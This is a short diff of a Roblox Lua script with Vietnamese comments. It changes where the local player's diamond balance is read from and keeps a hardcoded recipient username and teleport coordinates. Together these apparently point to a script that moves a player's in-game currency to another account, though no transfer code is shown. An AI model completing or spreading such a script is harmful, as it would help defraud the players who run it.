@@ -4,7 +4,7 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 -- Lấy người chơi cục bộ và các đối tượng liên quan
 local player = Players.LocalPlayer
 local leaderstats = player.leaderstats
-local diamonds = leaderstats["\240\159\146\142 Diamonds"].Value
+local diamonds = ReplicatedStorage.__DIRECTORY.Currency["Currency | Diamonds"].Value
 
 local teleportCoordinates = Vector3.new(143.34673614500, 23.6020991104125977, -349.0367736816406)
 local recipient = "chuideptrai1209"
